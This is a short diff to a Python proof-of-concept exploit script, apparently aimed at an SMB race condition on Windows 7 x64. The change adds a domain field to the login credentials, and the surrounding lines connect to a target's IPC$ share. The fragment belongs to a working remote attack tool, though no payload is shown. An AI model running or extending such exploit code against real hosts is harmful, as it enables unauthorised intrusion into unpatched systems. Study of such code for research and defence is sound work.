@@ -11,8 +11,9 @@ Note:
 - this PoC is tested against only Windows 7 x64 with 2 and 4 logical processors
 '''
 
-USERNAME = ''
-PASSWORD = ''
+USERNAME = ''		#Edit username
+PASSWORD = ''		#Edit password
+DOMAIN = ''		#Edit domain
 
 if len(sys.argv) != 2:
 	print("{} <ip>".format(sys.argv[0]))
@@ -22,7 +23,7 @@ target = sys.argv[1]
 
 
 conn = MYSMB(target)
-conn.login(USERNAME, PASSWORD)
+conn.login(USERNAME, PASSWORD, DOMAIN)
 
 # if share name is disk, the race is easier to win because there are more operation to do after InData is modified
 tid = conn.tree_connect_andx('\\\\'+target+'\\'+'IPC$')
